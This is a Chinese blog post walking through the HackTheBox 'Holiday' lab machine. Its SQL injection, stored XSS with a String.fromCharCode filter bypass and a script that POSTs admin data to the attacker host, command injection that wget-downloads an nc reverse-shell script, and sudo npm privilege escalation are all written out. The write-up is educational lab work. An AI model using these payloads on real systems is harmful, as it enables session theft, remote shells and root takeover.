> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/l8EfPepN1oQq-0jz7uAW0w)

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **104** 篇文章，本公众号会每日分享攻防渗透技术给大家。

![](https://mmbiz.qpic.cn/mmbiz_png/QkjvmbC1CD0zJ9hBlrElSv4ZqETGn3otgH8VHW1QuoOec3JMAbUyr0iaurJy4DPHBwUsDXiadJ3aha4CvJwyYVew/640?wx_fmt=png)

靶机地址：https://www.hackthebox.eu/home/machines/profile/22

靶机难度：初级（5.0/10）

靶机发布日期：2017 年 10 月 21 日

靶机描述：

Holiday is definitely one of the more challenging machines on HackTheBox. It touches on many different subjects and demonstrates the severity of stored XSS, which is leveraged to steal the session of an interactive user. The machine is very unique and provides an excellent learning experience.

请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/XrBsia6eKtTFtr4vwm8FVt5frF8ojc6Xtp0ChSOwic1tRYkxthCoB1v1SekZZzcuvLGhDnRCDt8IVxpHV9flfc9A/640?wx_fmt=png)

一、信息收集

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PXWEicxy2xC9I5LF9rFMqYCphbH3cCW3vuSv6ic9WhOhzpoJibNkQLKy2DAWiazzOcIg1RLfgZiauLaLG8ucgHOJGdw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPKlKkfSA1N9Lw933Fvd7KJfPxc3grR2l7khA5iaXdh8PTibUNjNZXzibaHkyKordoVAFeQcDzEPrsnw/640?wx_fmt=png)

可以看到靶机的 IP 是 10.10.10.25....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPKlKkfSA1N9Lw933Fvd7KJfrvUhpu1SolrPgoAzz1balbMoibMy4ck4xmoplf9ibcas6fVnia0hv1zg/640?wx_fmt=png)

Nmap 发现开放了 OpenSSH 和 Node.js 服务..... 访问看看

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPKlKkfSA1N9Lw933Fvd7KJhhnoiaC6VdbVOcrCSYQgc6BhSEMzkFWfNXK2FyOdRpM6S6U6Ps6dVrw/640?wx_fmt=png)

前端没发现什么有用的信息... 爆破

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPKlKkfSA1N9Lw933Fvd7KJ9rDe8oicMGZKg08ho48v6gicIpqs45qvuNJIRW1mk030Hq7CQELe056A/640?wx_fmt=png)

发现了很多目录...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPKlKkfSA1N9Lw933Fvd7KJVERZUnghSp7VNSOasEvLD8DOvOHFHicA1xcaanLlibAP4guQJ6k4YYPA/640?wx_fmt=png)

访问发现 login 存在用户登录页面... 利用 BP 拦截准备 sqlmap 注入...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPKlKkfSA1N9Lw933Fvd7KJBMm7rNjKnDyfAl32Sia75f91ia8CVqbyTGMbyicWy9SibKoYZY7icWwIKiaQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPKlKkfSA1N9Lw933Fvd7KJqWTAYu2Qc39C613roYxOqC6mPREs03TEmgHEpZBeSOCvNibAicNlGJJg/640?wx_fmt=png)

```
sqlmap -r dayusql --level 5 --risk 3 -T users --dump --threads 10
```

通过最简单最暴力的 sqlmap 爆破，发现了用户名和 hash 密码...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPKlKkfSA1N9Lw933Fvd7KJap3qad71Hl681hyCA983Xr8bVwqqiaDu11j17ibm9y7iaqhbqpIyMm4fg/640?wx_fmt=png)

通过页面解析获得了密码...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPKlKkfSA1N9Lw933Fvd7KJacEicz1RStdibwIia93hlDmWUvDD1C9ickae2s8Tx8FBNcK2icdM8TB7Viag/640?wx_fmt=png)

登陆后重定向到了一个页面，该页面看起来包含有用的信息... 点击 UUID 看看

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPKlKkfSA1N9Lw933Fvd7KJibIbAX7hicgffYmzsqiamicu0sTcqNeTd6YCKMJBb59ZFHric8ep8Zewflw/640?wx_fmt=png)

进入表单 UUID 后，最下面提示了该注释必须批准所有注释，并且可能需要一分钟的时间，意味着某种用户交互，可能每分钟一次...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPKlKkfSA1N9Lw933Fvd7KJtY8ziaErEcOpLf1Hw8VzF6m9FoaaUIXPR9zUcJKXSmUDhqIfekPl7TQ/640?wx_fmt=png)

通过 N 种测试结果....

利用 note 函数，发现它是易受攻击的 xss 的，由于管理员正在阅读注释，因此 XSS 可用于获取管理 cookie 值... 要运行 xss 并运行有效负载，需要使用 JavaScript 函数 String.fromCharCode 绕过过滤器以运行有效负载... 开始...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPKlKkfSA1N9Lw933Fvd7KJraZxSYiaNpX0n3pKJ2pyIm6Fm3oIKUblQpvr56Kdz3gUqVkncNficqMA/640?wx_fmt=png)

```
payload = '''document.write('<script src="http://10.10.14.51/dayu.js"></script>');'''
','.join([str(ord(c)) for c in payload])
```

这里需要使用 JavaScript 函数 String.fromCharCode 绕过过滤器以运行有效负载，需要将字符串转换为 ASCII 代码..

这里利用了 python 转换...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPKlKkfSA1N9Lw933Fvd7KJPgUibVx1zZe48Rqmd8uN1ukLN1tB4ibhAvydpLMfhKou9R7RMAsV6xYg/640?wx_fmt=png)

```
<img src="x/><script>eval(String.fromCharCode(<payload>));</script>">
```

成功转换后利用 google 搜索到针对 JavaScript 的 XSS 的有效负载过滤器....

将转换的 ASCII 放入即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPKlKkfSA1N9Lw933Fvd7KJyqHJjQhsooazVVVfmB9MFEHLpRjL05OGEuavUzia5xG9QauOM0Jic3tA/640?wx_fmt=png)

```
var url="http://localhost:8000/vac/8dd841ff-3f44-4f2b-9324-9a833e2c6b65";
$.ajax({ method: "GET",url: url,success: function(data)
{ $.post("http://10.10.14.51:8000/", data);}});
```

首先通过最前面的测试，利用 cookie 简单编写了 cookie 的脚本... 主要获取 admin 或者 system 等高权限用户的 cookie...

然后通过 JavaScript 的 XSS 的有效负载过滤器成功获得了高权限的 cookie....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPKlKkfSA1N9Lw933Fvd7KJ3XpO2ad78qhwjeEMicQWr3oJuyPpM3FI2kbnmcWIQ0lttMZZw8Kussg/640?wx_fmt=png)

直接替换 cookie 即可... 这里可以利用 F12 调试或者 BP 拦截写入都可以...

替换刷新页面，出现了 admin 值... 这是 admin 的 cookie...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPKlKkfSA1N9Lw933Fvd7KJkmCopkckL32Alu0yqnfJgNibPLbuyOmprJRJDYfoXpqm5pT6yctvMWg/640?wx_fmt=png)

将 url 替换成 admin 后，成功的登陆到了 admin 管理页面... 继续分析...

在下载 notes 后，分析存在注入，可利用 notes 读取到该用户底层的信息以及还具有写入功能...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPKlKkfSA1N9Lw933Fvd7KJlT9ag8PyA0Wy5sYJNUXDgbqj7V4MIqygYt0Ftxw5v6Qc8bldn8HCdw/640?wx_fmt=png)

通过 BP 测试，果然是可注入的... 读取到了

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPKlKkfSA1N9Lw933Fvd7KJwTOaCyn0kqKo2W0lE4ibsMLgNMcGibehBXfWm9LLqicAibZFZ7ONLLJsGQ/640?wx_fmt=png)

这里测试了正常 IP 情况下，命令注入不生效... 且报错... 通过各种测试...

这里需要将 IP 为十进制！！！

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPKlKkfSA1N9Lw933Fvd7KJ1EyEJoD6zdOzlZF8mtACy57xjhJZwJU6OSI0xhhmjZBoicD6tjUwrcA/640?wx_fmt=png)

将 IP 转换为十进制...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPKlKkfSA1N9Lw933Fvd7KJsSibAbWTe4qgcfzD74ctcOA4cDUMfqWvW2jmGaqIaGk7szqYzicZWInA/640?wx_fmt=png)

```
#!/bin/bash

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.51 5555 >/tmp/f
table=notes/%26wget+0x0a0a0e33/shell
```

通过简单的 shell 编写即可...  

然后利用转换的 IP，通过 wget 上传 shell... 可看到成功上传！

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPKlKkfSA1N9Lw933Fvd7KJuoLDehKo7QQsoEybNhP7CIvme8m41vkFFPeiazsRo8bsedgicZzFBdXQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPKlKkfSA1N9Lw933Fvd7KJDfvMwssibwSIib5ib1ibOx4yYeO8LD42fssoLNgIWG7ibTZzSfOlKAHA8kA/640?wx_fmt=png)

继续利用 bash 执行 shell，成功获得了反向 shell... 获得了 user.txt 的 flag...

并 sudo 发现该用户利用 npm 无需密码即可以 root 用户身份运行...

![](https://mmbiz.qpic.cn/mmbiz_png/1prMbIpCa3humOrLAChJmsjMl4Kxia7vzrQE59ny2bGibWz5Cr8YzNvia9NXzt8O2jiclnVwHYxubpFU1Q6dX9FRCQ/640?wx_fmt=png)

方法 1：

![](https://mmbiz.qpic.cn/mmbiz_png/5PYA1G5YGGkjAN1M3sw2tjaT2EzjYhfiax6biaK6IUQxeAFY5cgZQtGqXrMp1oRbNic8EDqpxsg5BjArxBhibLM5XQ/640?wx_fmt=png)

直接利用 npm 获取 root.txt 的 flag....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPKlKkfSA1N9Lw933Fvd7KJwP7F2PyAmdROROKJvJnvVtRmjeKL5NmLSYxmJHdecrIsrNuyuF9Nxw/640?wx_fmt=png)

```
mv package.json pack
ln -s /root/root.txt package.json
sudo /usr/bin/npm i *
```

直接利用 sudo 的提示，简单的执行写入即可读取到 root.txt 的 flag 信息...

![](https://mmbiz.qpic.cn/mmbiz_png/1prMbIpCa3humOrLAChJmsjMl4Kxia7vzrQE59ny2bGibWz5Cr8YzNvia9NXzt8O2jiclnVwHYxubpFU1Q6dX9FRCQ/640?wx_fmt=png)

方法 2：

![](https://mmbiz.qpic.cn/mmbiz_png/5PYA1G5YGGkjAN1M3sw2tjaT2EzjYhfiax6biaK6IUQxeAFY5cgZQtGqXrMp1oRbNic8EDqpxsg5BjArxBhibLM5XQ/640?wx_fmt=png)

google 搜索 npm 发现了提权 root 的 github...GO

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPKlKkfSA1N9Lw933Fvd7KJKSGiamsiaXMwCb2ZNn7gp0fUN6lkY3RHsJhDpBngzZxQ1LwZwzRtxhdw/640?wx_fmt=png)

```
https://github.com/joaojeronimo/rimrafall
```

找到了一种使用称为 rimrafall 的包来获得反向外壳的方法....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPKlKkfSA1N9Lw933Fvd7KJujtIrrMf6NqYiaicgBtkOCFjr1QeILs3VhsXRwfdCmFOmszUo60j1AEg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPKlKkfSA1N9Lw933Fvd7KJsw1MeawwOHwRdn0DxibIXkKCYVeQdnKlP62M8nibZ4epuENgDLtFIpsA/640?wx_fmt=png)

按照作者的解释，理解原理~~~

![](https://mmbiz.qpic.cn/mmbiz_png/QkjvmbC1CD0zJ9hBlrElSv4ZqETGn3otgH8VHW1QuoOec3JMAbUyr0iaurJy4DPHBwUsDXiadJ3aha4CvJwyYVew/640?wx_fmt=png)

只需要修改目录信息... 利用 bash 直接提权目录文件为 root 权限... 成功获得了 root 权限获得了 root.txt 的 flag 信息...

这篇文件较难，主要为 XSS 那块~~

学到了很多... 中途测试了太多次... 注入注入在注入...

加油！！！

由于我们已经成功得到 root 权限查看 user 和 root.txt，因此完成这台中级的靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

随缘收徒中~~ **随缘收徒中~~** **随缘收徒中~~**

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)